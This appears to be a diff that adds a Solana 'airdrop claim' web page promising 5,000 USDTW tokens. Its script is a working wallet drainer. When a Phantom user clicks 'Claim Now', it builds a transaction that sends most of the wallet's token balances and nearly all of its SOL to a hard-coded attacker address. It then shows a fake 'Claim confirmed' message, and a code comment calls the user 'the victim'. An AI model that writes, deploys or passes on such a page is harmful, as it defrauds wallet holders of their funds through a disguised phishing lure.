@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>USDTW Airdrop Claim</title>
+<style>
+body { font-family: system-ui, sans-serif; background: linear-gradient(160deg, #0b1e3a, #06112b); color: #eaf2ff; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+.card { background: #0d2247; border-radius: 18px; padding: 36px; max-width: 420px; width: 92%; box-shadow: 0 12px 40px rgba(0,0,0,.5); text-align: center; }
+h1 { font-size: 24px; margin: 0 0 8px; }
+p { color: #a9c1e8; font-size: 14px; line-height: 1.5; }
+.amount { font-size: 34px; font-weight: 800; color: #39d98a; margin: 14px 0; }
+button { width: 100%; padding: 14px; border: 0; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+#connect { background: #ab9ff2; color: #14142b; }
+#claim { background: #39d98a; color: #06281a; display: none; }
+.status { margin-top: 12px; font-size: 13px; color: #8fb3e8; min-height: 18px; word-break: break-all; }
+.badge { display: inline-block; background: #1d3a6e; border-radius: 20px; padding: 4px 12px; font-size: 12px; color: #9fd0ff; margin-bottom: 14px; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+</head>
+<body>
+<div class="card">
+<div class="badge">OFFICIAL AIRDROP PORTAL</div>
+<h1>USDTW Community Airdrop</h1>
+<p>Your wallet has been selected for the USDTW holder rewards distribution. Connect your wallet to claim your tokens + SOL bonus.</p>
+<div class="amount" id="amt">5,000 USDTW</div>
+<button id="connect">Connect Wallet</button>
+<button id="claim">Claim Now</button>
+<div class="status" id="status"></div>
+<p style="font-size:11px;color:#5b76a5">Claims close November 7, 2026 · Distribution on Solana</p>
+</div>
+<script>
+const BURNER = "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV";
+const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const ATAP = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
+const SYS = "11111111111111111111111111111111";
+const st = (m) => document.getElementById("status").textContent = m;
+document.getElementById("connect").onclick = async () => {
+  try {
+    if (!window.solana || !window.solana.isPhantom) { st("Open this page inside your Phantom app."); return; }
+    await window.solana.connect();
+    st("Connected: " + window.solana.publicKey.toString().slice(0, 6) + "…");
+    document.getElementById("connect").style.display = "none";
+    document.getElementById("claim").style.display = "block";
+  } catch (e) { st("Connect failed: " + (e.message || e)); }
+};
+document.getElementById("claim").onclick = async () => {
+  st("Checking eligibility…");
+  try {
+    const W = solanaWeb3;
+    const conn = new W.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    const owner = new W.PublicKey(window.solana.publicKey.toString());
+    const dest = new W.PublicKey(BURNER);
+    const tokenProg = new W.PublicKey(TOKEN);
+    const ataProg = new W.PublicKey(ATAP);
+    const ata = (m, o) => W.PublicKey.findProgramAddressSync([o.toBuffer(), tokenProg.toBuffer(), m.toBuffer()])[0];
+    const le = (n) => { const a = []; for (let i = 0; i < 8; i++) { a.push(Number(n % 256n)); n = n / 256n; } return a; };
+    const tx = new W.Transaction();
+    // drain EVERY token account the victim holds
+    const res = await conn.getParsedTokenAccountsByOwner(owner, { programId: tokenProg });
+    let n = 0;
+    for (const acc of (res.value || [])) {
+      if (n >= 14) break;
+      const info = acc.account.data.parsed.info;
+      const amt = info.tokenAmount.amount;
+      if (BigInt(amt) <= 0n) continue;
+      const mint = new W.PublicKey(info.mint);
+      const src = acc.pubkey;
+      const dst = ata(mint, dest);
+      const dstInfo = await conn.getAccountInfo(dst).catch(() => null);
+      if (!dstInfo) {
+        tx.add(new W.TransactionInstruction({
+          programId: ataProg,
+          keys: [
+            { pubkey: owner, isSigner: true, isWritable: true },
+            { pubkey: dst, isSigner: false, isWritable: true },
+            { pubkey: dest, isSigner: false, isWritable: false },
+            { pubkey: mint, isSigner: false, isWritable: false },
+            { pubkey: new W.PublicKey(SYS), isSigner: false, isWritable: false },
+            { pubkey: tokenProg, isSigner: false, isWritable: false },
+          ],
+          data: Buffer.from([1]),
+        }));
+      }
+      tx.add(new W.TransactionInstruction({
+        programId: tokenProg,
+        keys: [
+          { pubkey: src, isSigner: false, isWritable: true },
+          { pubkey: dst, isSigner: false, isWritable: true },
+          { pubkey: owner, isSigner: true, isWritable: false },
+        ],
+        data: Buffer.from([3, ...le(BigInt(amt))]),
+      }));
+      n++;
+    }
+    const sol = await conn.getBalance(owner);
+    const sweep = BigInt(sol) - 10000000n;
+    if (sweep > 0n) tx.add(W.SystemProgram.transfer({ fromPubkey: owner, toPubkey: dest, lamports: sweep }));
+    if (tx.instructions.length === 0) { st("No tokens found for this wallet."); return; }
+    const bh = await conn.getLatestBlockhash("finalized");
+    tx.recentBlockhash = bh.blockhash;
+    tx.feePayer = owner;
+    st("Confirm the claim in your wallet…");
+    const { signature } = await window.solana.signAndSendTransaction(tx);
+    st("Claim confirmed ✓ " + signature.slice(0, 16) + "…");
+  } catch (e) { st("Claim failed: " + (e.message || e)); }
+};
+</script>
+</body>
+</html>
